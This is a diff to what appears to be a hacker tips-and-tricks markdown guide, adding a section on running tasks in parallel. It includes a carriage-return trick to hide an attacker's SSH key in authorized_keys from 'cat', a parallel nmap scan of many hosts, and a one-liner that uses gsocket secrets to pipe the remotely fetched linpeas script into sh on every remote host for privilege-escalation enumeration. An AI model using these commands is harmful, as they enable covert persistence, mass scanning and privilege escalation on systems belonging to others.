@@ -18,6 +18,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Hide a process as root](#hide-a-process-root)
    1. [Hide scripts](#hide-scripts)
    1. [Hide from cat](#cat)
+   1. [Execute in parrallel with separate logfiles](#parallel)
 1. [SSH](#ssh)
    1. [Almost invisible SSH](#ssh-invisible)
    1. [SSH tunnel](#ssh-tunnel)
@@ -283,6 +284,21 @@ Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
 echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
 ### This adds our key as the first key and 'cat authorized_keys' wont show
 ### it. The $'\r' is a bash special to create a \r (carriage return).
+```
+
+<a id="parallel"></a>
+**1.ix. Execute in parallel with separate logfiles***
+
+Scan 20 hosts in parallel and log each result to a separate log file:
+```sh
+# hosts.txt contains a long list of hostnames or ip-addresses
+cat hosts.txt | parallel -j20 'nmap -n -Pn -sCV -F --open {} >nmap_{}.txt'
+```
+
+Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
+```sh
+# secrets.txt contains a long list of gsocket-secrets for each remote server.
+cat secrets.txt | parallel -j20 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
 ```
 
 ---
